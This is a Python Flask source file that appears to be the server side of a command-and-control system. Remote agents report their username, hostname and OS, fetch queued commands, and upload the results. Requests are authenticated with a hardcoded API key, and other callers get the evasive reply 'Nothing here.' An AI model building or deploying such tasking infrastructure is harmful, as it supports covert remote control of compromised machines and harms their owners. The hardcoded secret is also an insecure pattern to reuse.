from flask import Blueprint, request, jsonify, abort
from model import agent_calls_model

api_key = "f3a6d88bdfc14c98a2a0f754b4dc9ecda63f31cbe91e9f1a4e7923b08e3b6c61"

agent_calls = Blueprint("agent_calls", __name__)

def require_api_key(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get('X-API-Key')
        if not key or key != api_key:
            abort(401, description="Nothing here.")
        return f(*args, **kwargs)
    return decorated

@agent_calls.route("/check_in", methods=["POST"])
@require_api_key
def get_check_in():
    data = request.get_json()
    agent_calls_model.check_in(data["agent_id"], data["agent_username"], data["agent_hostname"], data["agent_os"])
    return jsonify({"result": "ok"}), 201

@agent_calls.route("/check_commands", methods=["POST"])
@require_api_key
def get_check_commands():
    data = request.get_json()
    commands = agent_calls_model.check_commands(data["agent_id"])
    return commands, 201

@agent_calls.route("/add_command_result", methods=["POST"])
@require_api_key
def add_command_result():
    data = request.get_json()
    commands = agent_calls_model.add_command_result(data["command_id"], data["command_result"])
    print(commands)
    return jsonify({"result": "ok"}), 201